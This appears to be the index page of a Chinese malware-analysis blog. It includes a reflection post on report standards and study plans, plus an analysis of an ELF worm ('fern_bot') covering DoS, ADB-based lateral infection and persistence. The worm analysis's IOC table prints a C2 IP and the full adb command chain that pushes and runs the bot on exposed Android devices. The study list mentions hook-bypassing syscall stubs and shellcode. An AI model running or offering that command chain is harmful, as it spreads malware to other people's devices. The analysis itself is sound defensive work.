@@ -1,0 +1,1620 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#1a1a1a" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">
+<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=20260718">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"woshinext.top","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":260,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js?v=20260718" defer></script>
+
+    <meta name="description" content="记录样本分析、脱壳去混淆、反调试对抗等底层安全技术笔记。">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Next的小站">
+<meta property="og:url" content="https://woshinext.top/index.html">
+<meta property="og:site_name" content="Next的小站">
+<meta property="og:description" content="记录样本分析、脱壳去混淆、反调试对抗等底层安全技术笔记。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="Next">
+<meta property="article:tag" content="恶意代码分析,逆向工程,CTF,脱壳,样本分析,PE结构,反调试,木马分析,IDA,Shellcode">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://woshinext.top/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Next的小站 - 恶意代码分析 & 逆向工程</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.1.0/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/7.2.0/pangu.umd.js" integrity="sha256-JnmRRnJK7DC6RQJbAJb6AXOM9OmWzS6z8eYultk/48Y=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js?v=20260718" defer></script><script src="/js/motion.js?v=20260718" defer></script><script src="/js/sidebar.js?v=20260718" defer></script><script src="/js/next-boot.js?v=20260718" defer></script><script src="/js/pjax.js?v=20260718" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js?v=20260718" defer></script>
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js?v=20260718" defer></script>
+
+
+
+
+
+  
+
+
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/3.0.1/quicklink.umd.js" integrity="sha256-44BednzIpUeQJcY8qtLyarFu0UCCTbgmWOvaoehiFQQ=" crossorigin="anonymous" defer></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://woshinext.top/"}</script>
+  <script src="/js/third-party/quicklink.js?v=20260718" defer></script>
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css?v=20260718">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Next的小站" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Next的小站" type="application/rss+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Next的小站</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">恶意代码分析 & 逆向工程</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-首页"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-归档"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-关于"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-样本分析"><a href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" rel="section"><i class="fa fa-bug fa-fw"></i>样本分析</a></li><li class="menu-item menu-item-流量分析"><a href="/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="section"><i class="fa fa-network-wired fa-fw"></i>流量分析</a></li><li class="menu-item menu-item-逆向基础"><a href="/categories/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/" rel="section"><i class="fa fa-microscope fa-fw"></i>逆向基础</a></li><li class="menu-item menu-item-日志分析"><a href="/categories/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" rel="section"><i class="fa fa-clipboard-list fa-fw"></i>日志分析</a></li><li class="menu-item menu-item-其他"><a href="/categories/%E5%85%B6%E4%BB%96/" rel="section"><i class="fa fa-ellipsis-h fa-fw"></i>其他</a></li><li class="menu-item menu-item-标签"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Next</p>
+  <div class="site-description" itemprop="description">记录样本分析、脱壳去混淆、反调试对抗等底层安全技术笔记。</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/availblemy" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;availblemy" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+        <div class="pjax">
+        </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block cat-其他">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://woshinext.top/2026/06/15/%E6%80%BB%E7%BB%93%E5%92%8C%E5%8F%8D%E6%80%9D/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Next">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Next的小站">
+      <meta itemprop="description" content="记录样本分析、脱壳去混淆、反调试对抗等底层安全技术笔记。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Next的小站">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/06/15/%E6%80%BB%E7%BB%93%E5%92%8C%E5%8F%8D%E6%80%9D/" class="post-title-link" itemprop="url">总结和反思</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-06-15 17:34:08" itemprop="dateCreated datePublished" datetime="2026-06-15T17:34:08+08:00">2026-06-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>719</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>3 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="报告规范"><a href="#报告规范" class="headerlink" title="报告规范"></a>报告规范</h2><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p>每篇样本分析报告须覆盖以下 10 节：</p>
+<ol>
+<li><strong>概述</strong> — 样本 SHA256、来源、家族归属（一句话定性）</li>
+<li><strong>静态分析</strong> — 文件结构、编译信息、混淆方式、关键字符串</li>
+<li><strong>动态分析</strong> — 进程行为、持久化机制、反分析手段</li>
+<li><strong>核心载荷</strong> — 加密算法、C2 通信协议</li>
+<li><strong>ATT&amp;CK 映射</strong> — 战术 → 技术编号 → 本样本中的具体体现</li>
+<li><strong>IOC</strong> — SHA256 &#x2F; C2 域名 &#x2F; 互斥体 &#x2F; 文件路径 &#x2F; 注册表（表格形式）</li>
+<li><strong>网络流量</strong> — JA3 指纹、心跳包特征、请求 URI</li>
+<li><strong>YARA 规则</strong> — 每条 ≥ 5 个 strings</li>
+<li><strong>归因线索</strong> — 与已知组织 TTP 对比，标注置信度</li>
+<li><strong>待深入</strong> — 列明未完成的分析点</li>
+</ol>
+<h3 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h3><ul>
+<li>每张截图须有对应文字说明，连续两张截图之间须有过渡文字</li>
+<li>删除后文章仍通顺的截图一律删除</li>
+<li>反编译代码、字符串列表、简单分支逻辑使用代码块展示，不要截图</li>
+<li>保留的截图必须用 Greenshot 添加红框&#x2F;箭头标注关键位置</li>
+</ul>
+<h3 id="措辞"><a href="#措辞" class="headerlink" title="措辞"></a>措辞</h3><table>
+<thead>
+<tr>
+<th>禁止</th>
+<th>替代</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>“可以看见……”</td>
+<td>“分析发现””该函数实现了””如图所示”</td>
+</tr>
+<tr>
+<td>木马&#x2F;病毒&#x2F;蠕虫混用</td>
+<td>按实际类型准确使用 Trojan &#x2F; RAT &#x2F; Worm &#x2F; Ransomware</td>
+</tr>
+<tr>
+<td>“有空再分析”</td>
+<td>“待深入分析：1) … 2) …”</td>
+</tr>
+<tr>
+<td>用截图代替文字说明</td>
+<td>文字说明结论，截图作为证据佐证</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="待学清单"><a href="#待学清单" class="headerlink" title="待学清单"></a>待学清单</h2><ul>
+<li><p><input disabled="" type="checkbox"> 
+ATT&amp;CK 矩阵映射 — <a target="_blank" rel="noopener" href="https://attack.mitre.org/">https://attack.mitre.org</a></p>
+</li>
+<li><p><input disabled="" type="checkbox"> 
+YARA 规则编写 — 每个样本产出 1 条规则</p>
+</li>
+<li><p><input disabled="" type="checkbox"> 
+网络流量分析 — Wireshark 抓包、JA3 指纹提取、心跳包识别</p>
+</li>
+<li><p><input disabled="" type="checkbox"> 
+R3 Syscall — ntdll 调用链分析，自写 syscall stub 绕过用户态 Hook</p>
+</li>
+<li><p><input disabled="" type="checkbox"> 
+R0 驱动分析 — WinDbg 双机调试，分析恶意 .sys（回调注册&#x2F;进程隐藏&#x2F;网络拦截）</p>
+</li>
+<li><p><input disabled="" type="checkbox"> 
+VMProtect 壳 — 识别 VMP 区段特征，dump 内存定位非虚拟化代码</p>
+</li>
+<li><p><input disabled="" type="checkbox"> 
+Shellcode 编写 — 位置无关代码（PIC）、反射式 DLL 加载</p>
+</li>
+<li><p><input disabled="" type="checkbox"> 
+APT 归因 — 精读 20 份公开报告，建立 TTP 特征库，进行 5 次独立归因练习</p>
+</li>
+</ul>
+<hr>
+<h2 id="项目规划"><a href="#项目规划" class="headerlink" title="项目规划"></a>项目规划</h2><h3 id="攻击链重建器（Python）"><a href="#攻击链重建器（Python）" class="headerlink" title="攻击链重建器（Python）"></a>攻击链重建器（Python）</h3><ul>
+<li><input disabled="" type="checkbox"> 输入 Security.evtx → 解析 4688&#x2F;5156&#x2F;4657&#x2F;4663 → 进程树关联</li>
+<li><input disabled="" type="checkbox"> 自动识别攻击阶段（初始执行 → 持久化 → C2）</li>
+<li><input disabled="" type="checkbox"> 输出 JSON + Markdown 时间线</li>
+<li><input disabled="" type="checkbox"> 3 个银狐样本 EVTX 验证</li>
+</ul>
+<h3 id="配置提取框架（C-）"><a href="#配置提取框架（C-）" class="headerlink" title="配置提取框架（C++）"></a>配置提取框架（C++）</h3><ul>
+<li><input disabled="" type="checkbox"> 插件架构，首批 3 插件：QuasarRAT &#x2F; 银狐 &#x2F; FernBot</li>
+<li><input disabled="" type="checkbox"> 手动解析 PE Section &#x2F; ELF Segment</li>
+<li><input disabled="" type="checkbox"> 批量扫描 + 统一 JSON 输出</li>
+<li><input disabled="" type="checkbox"> 10 样本验证，准确率 ≥ 80%</li>
+<li><input disabled="" type="checkbox"> CLI：<code>mcconfig extract sample.bin --family quasar</code></li>
+</ul>
+<hr>
+<h2 id="核心认知"><a href="#核心认知" class="headerlink" title="核心认知"></a>核心认知</h2><ul>
+<li><strong>当前状态：</strong> 14 篇博客有逆向深度但缺格式、有分析过程但缺 ATT&amp;CK、有 shellcode 追踪但缺 YARA。不是能力不够，是能力没对准靶子。</li>
+<li><strong>核心转向：</strong> 从”我会分析样本”转向”我能输出结构化证据”。每个样本产 ATT&amp;CK + YARA + IOC + 流量指纹，分析即积累，积累即归因。</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%8F%8D%E6%80%9D/" rel="tag"><i class="fa fa-tag"></i> 反思</a>
+              <a href="/tags/%E6%80%BB%E7%BB%93/" rel="tag"><i class="fa fa-tag"></i> 总结</a>
+          </div>
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block cat-样本分析">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://woshinext.top/2026/06/10/elf%E6%96%87%E4%BB%B6%E6%9C%A8%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Next">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Next的小站">
+      <meta itemprop="description" content="记录样本分析、脱壳去混淆、反调试对抗等底层安全技术笔记。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Next的小站">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/06/10/elf%E6%96%87%E4%BB%B6%E6%9C%A8%E9%A9%AC/" class="post-title-link" itemprop="url">elf文件蠕虫木马病毒</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-06-10 16:22:28" itemprop="dateCreated datePublished" datetime="2026-06-10T16:22:28+08:00">2026-06-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">样本分析</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>633</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>2 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260610163246401.png" alt="image-20260610163246401"></p>
+<p>socket（1，1，0）使用tcp协议，其中ensure_persistence有着大量的持久化技术，先看下面的流量加密逻辑</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260610163536566.png" alt="image-20260610163536566"></p>
+<p>可以清楚的看见它使用了0x7f进行异或加密</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260610170119088.png" alt="image-20260610170119088"></p>
+<p>这里可以看到用三个命令用来交互</p>
+<p>第一个是用来dos攻击的</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260610170053251.png" alt="image-20260610170053251"></p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260610170201491.png" alt="image-20260610170201491"></p>
+<p>可以看见它有8中的常见dos攻击，并且会将信息返回c2服务器</p>
+<p>第二和是用来横向感染的</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260610170440722.png" alt="image-20260610170440722"></p>
+<p>先是提取本地ip用于后面的感染</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260610170604319.png"></p>
+<p>然后循环判断子网段下有没有ip</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260610171029155.png" alt="image-20260610171029155"></p>
+<p>这个是感染核心逻辑使用开放的5555端口来投放木马文件</p>
+<p>第三个是用来执行shell命令来远程操控</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260610172009038.png" alt="image-20260610172009038"></p>
+<p>popen是执行函数其他的是一些数据处理</p>
+<p>接下来我来分析下持久化的函数ensure_persistence</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260610173502416.png" alt="image-20260610173502416"></p>
+<p>它先是加入了一些开机自启的目录这些都是不同系统下的开机目录</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260610173824620.png" alt="image-20260610173824620"></p>
+<p>install_chipset_persistence()这个是芯片级的持久化install_root_persistence()这个是有root权限的持久化install_nonroot_persistence()这个是非root权限的持久化</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260610174148418.png" alt="image-20260610174148418"></p>
+<p>这个是对物联网系统的install_iot_persistence()持久化</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260610180130870.png" alt="image-20260610180130870"></p>
+<p>这里是创建了一个shell脚本来看主程序有没有存在没有就启动后面是主程序检查脚本存在吗，是两个进程互相检查</p>
+<p>这里我们可以看到如果程序运行起来后几乎是很难删除的。</p>
+<p>最后我来做一下流量分析</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260610182710249.png" alt="image-20260610182710249"></p>
+<p>可以看见这个程序发送了请求但是我这个虚拟机断网了没有完成三次握手就没有发送流量了</p>
+<p>下面的ioc和hash值</p>
+<table>
+<thead>
+<tr>
+<th>ip</th>
+<th>176.65.139.41</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>主程序隐藏副本</td>
+<td>&#x2F;data&#x2F;local&#x2F;tmp&#x2F;.fern_bot</td>
+<td></td>
+</tr>
+<tr>
+<td>主程序隐藏副本</td>
+<td>&#x2F;dev&#x2F;.fern_bot</td>
+<td></td>
+</tr>
+<tr>
+<td>主程序隐藏副本</td>
+<td>&#x2F;tmp&#x2F;.fern_bot</td>
+<td></td>
+</tr>
+<tr>
+<td>主程序隐藏副本</td>
+<td>&#x2F;sdcard&#x2F;.fern_bot</td>
+<td></td>
+</tr>
+<tr>
+<td>主程序隐藏副本</td>
+<td>&#x2F;jffs&#x2F;.sysupd</td>
+<td></td>
+</tr>
+<tr>
+<td>持久化文件路径</td>
+<td>&#x2F;etc&#x2F;init.d&#x2F;S99sysupd</td>
+<td>SysVinit 启动脚本</td>
+</tr>
+<tr>
+<td>持久化文件路径</td>
+<td>&#x2F;etc&#x2F;hotplug.d&#x2F;iface&#x2F;99-sysupd</td>
+<td>Hotplug 事件触发</td>
+</tr>
+<tr>
+<td>持久化文件路径</td>
+<td>&#x2F;etc&#x2F;crontabs&#x2F;root</td>
+<td>Crontab 定时任务</td>
+</tr>
+<tr>
+<td>持久化文件路径</td>
+<td>&#x2F;data&#x2F;local&#x2F;tmp&#x2F;.dex</td>
+<td></td>
+</tr>
+<tr>
+<td>持久化文件路径</td>
+<td>&#x2F;data&#x2F;local&#x2F;tmp&#x2F;.sys</td>
+<td></td>
+</tr>
+<tr>
+<td>进程与系统 IOC</td>
+<td>fern_bot</td>
+<td></td>
+</tr>
+<tr>
+<td>进程与系统 IOC</td>
+<td>kworker</td>
+<td></td>
+</tr>
+<tr>
+<td>命令行 IOC</td>
+<td>&#96;while true; do grep -q ‘fernet_hb’ &#x2F;proc&#x2F;net&#x2F;unix</td>
+<td></td>
+</tr>
+<tr>
+<td>命令行 IOC</td>
+<td>adb connect %s:5555 &amp;&amp; adb push .fern_bot &#x2F;data&#x2F;local&#x2F;tmp&#x2F; &amp;&amp; adb shell chmod 777 .fern_bot &amp;&amp; adb shell nohup .&#x2F;fern_bot &amp;</td>
+<td>横向感染安卓设备的完整命令链</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>sha256</th>
+<th>3d91b861984bda9fb52b9c082a2839d0a11a9d83979c79676a8667472da8cc09</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>md5</td>
+<td>d2ec16db8621508cada2d9fd60127409</td>
+</tr>
+<tr>
+<td>sha1</td>
+<td>9f36ac3143357a25935d812f3cc738129188ec84</td>
+</tr>
+</tbody></table>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%9C%A8%E9%A9%AC/" rel="tag"><i class="fa fa-tag"></i> 木马</a>
+              <a href="/tags/ELF/" rel="tag"><i class="fa fa-tag"></i> ELF</a>
+              <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a>
+          </div>
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block post-featured cat-样本分析">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://woshinext.top/2026/05/27/5-27-%E9%93%B6%E7%8B%90%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Next">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Next的小站">
+      <meta itemprop="description" content="记录样本分析、脱壳去混淆、反调试对抗等底层安全技术笔记。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Next的小站">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/05/27/5-27-%E9%93%B6%E7%8B%90%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">5.27-银狐木马分析</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-05-27 21:45:27" itemprop="dateCreated datePublished" datetime="2026-05-27T21:45:27+08:00">2026-05-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">样本分析</span></a>
+        </span>
